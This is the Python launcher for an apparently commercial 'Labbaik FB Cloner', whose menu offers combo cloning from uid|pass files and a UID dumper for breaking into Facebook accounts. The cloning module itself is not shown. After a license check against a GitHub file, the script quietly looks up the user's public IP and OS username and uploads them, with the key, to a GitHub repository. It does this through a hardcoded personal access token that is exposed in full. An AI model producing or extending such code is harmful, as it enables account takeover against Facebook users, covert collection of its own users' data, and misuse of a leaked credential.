import os, requests, sys, time
from datetime import datetime

# GitHub Keys Raw File
KEY_FILE_URL = "https://raw.githubusercontent.com/Labbaik757/Labbaik-Official/main/keys/approved_keys.txt"

# GitHub Logs Upload Repo Info
GITHUB_TOKEN = "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"
REPO_OWNER = "Labbaik757"
REPO_NAME = "labbaik-logs"
LOG_FILE_NAME = "logs.txt"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def check_key(entered_key):
    try:
        response = requests.get(KEY_FILE_URL)
        if entered_key in response.text:
            return True
    except:
        pass
    return False

def upload_log(username, ip, key):
    log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] USERNAME: {username}, IP: {ip}, KEY: {key}\n"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    api_url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{LOG_FILE_NAME}"

    try:
        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            sha = response.json()['sha']
            content = requests.get(f"https://raw.githubusercontent.com/{REPO_OWNER}/{REPO_NAME}/main/{LOG_FILE_NAME}").text + log
        else:
            sha = None
            content = log

        import base64
        encoded = base64.b64encode(content.encode()).decode()
        data = {
            "message": "update logs",
            "content": encoded,
            "branch": "main"
        }
        if sha:
            data["sha"] = sha

        requests.put(api_url, json=data, headers=headers)

    except Exception as e:
        print("Log upload failed:", e)

def main_menu():
    clear()
    print(f"""\033[1;32m
╭──────────────────────────────────────────╮
│ 💥 Labbaik FB Cloner - By Mohammad Maaz │
│ 🔑 Version : 2.0 (Premium)               │
│ 🛠️ Status  : Premium Tool                │
╰──────────────────────────────────────────╯\033[0m
""")
    print("1️⃣ Start Combo Cloning (uid|pass file)")
    print("2️⃣ UID Dumper + Combo Builder")
    print("🚪 Exit")
    choice = input("\n📌 Choose option (1 / 2): ")

    if choice == "1":
        import clone_module
        clone_module.combo_cloner()
    elif choice == "2":
        import clone_module
        clone_module.uid_dumper_combo()
    else:
        print("Exiting...")
        sys.exit()

def start():
    clear()
    print("\n\033[1;33m💥 Welcome to Labbaik FB Cloner Tool - Premium Access Required\033[0m")
    entered_key = input("🔐 Enter your premium license key: ").strip()

    if check_key(entered_key):
        ip = requests.get("https://api.ipify.org").text
        username = os.getenv("USERNAME") or os.getenv("USER") or "unknown"
        upload_log(username, ip, entered_key)
        print("\n✅ Key verified. Starting tool...")
        time.sleep(2)
        main_menu()
    else:
        print("\n❌ Invalid or expired key. Please contact support.")
        print("📞 WhatsApp: +923079741690")
        print("📬 Telegram: @LabbaikSupport")
        sys.exit()

if __name__ == "__main__":
    start()
